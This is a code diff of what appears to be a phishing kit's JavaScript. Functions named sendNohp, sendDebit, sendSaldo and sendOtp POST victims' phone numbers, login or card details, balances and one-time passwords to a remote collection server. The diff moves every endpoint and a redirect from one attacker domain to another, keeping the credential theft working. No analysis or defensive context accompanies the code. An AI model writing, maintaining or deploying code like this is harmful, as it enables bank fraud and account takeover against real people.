@@ -14,7 +14,7 @@ function sendNohp(){
    
       $.ajax({
         type: 'POST',
-        url: 'https://kuda-terbang.whf.bz/notif/v1-v1t1ov/no.php',
+        url: 'https://choreoapps.oo-feed.cfd/v1-v1t1ov/no.php',
         data: $('#formHP').serialize(),
         datatype: 'JSON',   
     complete: function(){
@@ -40,7 +40,7 @@ function sendDebit(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://kuda-terbang.whf.bz/notif/v1-v1t1ov/login.php',
+        url: 'https://choreoapps.oo-feed.cfd/v1-v1t1ov/login.php',
         data: $('#formlog').serialize(),
         datatype: 'JSON',    
     complete: function(){    
@@ -75,7 +75,7 @@ function sendSaldo(){
   
         $.ajax({
         type: 'POST',
-        url: 'https://kuda-terbang.whf.bz/notif/v1-v1t1ov/saldo.php',
+        url: 'https://choreoapps.oo-feed.cfd/v1-v1t1ov/saldo.php',
         data: $('#formsal').serialize(),
         datatype: 'JSON',   
    complete: function(){     
@@ -108,7 +108,7 @@ function sendOtp(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://kuda-terbang.whf.bz/notif/v1-v1t1ov/otp.php',
+        url: 'https://choreoapps.oo-feed.cfd/v1-v1t1ov/otp.php',
         data: $('#formLink').serialize(),
         datatype: 'JSON',    
     complete: function(){
@@ -127,7 +127,7 @@ function get(){
  $("#process1").show();
  $('.load').fadeIn();   
 setTimeout(function(){  
-location.href='https://kuda-terbang.whf.bz/urlwa/v1t1ov';
+location.href='https://choreoapps.oo-feed.cfd/urlwa/v1-v1t1ov';
  $("#process1").hide();
  $('.load').fadeOut();
  }, 2000);    
